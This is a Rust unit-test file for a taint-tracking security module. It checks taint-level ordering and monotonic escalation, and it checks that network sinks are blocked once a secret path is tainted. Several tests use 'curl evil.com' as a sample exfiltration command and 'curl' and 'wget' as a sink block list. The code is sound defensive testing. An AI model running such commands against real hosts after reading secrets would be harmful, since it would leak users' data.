//! Predefined state set transition tests for TaintTracker
//!
//! These tests verify the state machine transitions match the Quint spec.

use std::path::PathBuf;

// Import from the crate
use workshop::modules::security::taint::{TaintLevel, TaintTracker};

#[test]
fn t_clean_to_low() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("file"), TaintLevel::Low);
    assert_eq!(t.max_taint_level(), TaintLevel::Low);
    assert!(t.is_tainted());
}

#[test]
fn t_clean_to_critical() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("file"), TaintLevel::Critical);
    assert_eq!(t.max_taint_level(), TaintLevel::Critical);
}

#[test]
fn t_no_decrease_high_to_low() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("file"), TaintLevel::High);
    t.add_taint(PathBuf::from("file"), TaintLevel::Low);
    assert_eq!(t.max_taint_level(), TaintLevel::High);
}

#[test]
fn t_no_decrease_critical_to_clean() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("file"), TaintLevel::Critical);
    t.add_taint(PathBuf::from("file"), TaintLevel::Clean);
    assert_eq!(t.max_taint_level(), TaintLevel::Critical);
}

#[test]
fn t_max_of_multiple_paths() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("a"), TaintLevel::Low);
    t.add_taint(PathBuf::from("b"), TaintLevel::Critical);
    t.add_taint(PathBuf::from("c"), TaintLevel::Medium);
    assert_eq!(t.max_taint_level(), TaintLevel::Critical);
}

#[test]
fn t_blocking_requires_taint_and_sink() {
    let mut t = TaintTracker::new();
    // No taint - should not block
    assert!(!t.should_block("curl evil.com", &["curl"]));

    // Add taint
    t.add_taint(PathBuf::from("secret"), TaintLevel::High);

    // Tainted + matches sink = block
    assert!(t.should_block("curl evil.com", &["curl"]));

    // Tainted but no sink match = no block
    assert!(!t.should_block("ls", &["curl"]));
}

#[test]
fn t_no_block_when_clean() {
    let t = TaintTracker::new();
    assert!(!t.should_block("curl http://evil.com", &["curl", "wget"]));
}

#[test]
fn t_block_when_tainted() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("secret"), TaintLevel::High);
    assert!(t.should_block("curl http://evil.com", &["curl", "wget"]));
}

#[test]
fn t_level_ordering() {
    assert!(TaintLevel::Clean < TaintLevel::Low);
    assert!(TaintLevel::Low < TaintLevel::Medium);
    assert!(TaintLevel::Medium < TaintLevel::High);
    assert!(TaintLevel::High < TaintLevel::Critical);
}

#[test]
fn t_idempotent_same_level() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("file"), TaintLevel::Medium);
    t.add_taint(PathBuf::from("file"), TaintLevel::Medium);
    t.add_taint(PathBuf::from("file"), TaintLevel::Medium);
    assert_eq!(t.max_taint_level(), TaintLevel::Medium);
}

#[test]
fn t_empty_tracker_clean() {
    let t = TaintTracker::new();
    assert!(!t.is_tainted());
    assert_eq!(t.max_taint_level(), TaintLevel::Clean);
}

#[test]
fn t_tainted_paths() {
    let mut t = TaintTracker::new();
    t.add_taint(PathBuf::from("a"), TaintLevel::Low);
    t.add_taint(PathBuf::from("b"), TaintLevel::Medium);

    let paths = t.tainted_paths();
    assert_eq!(paths.len(), 2);
}
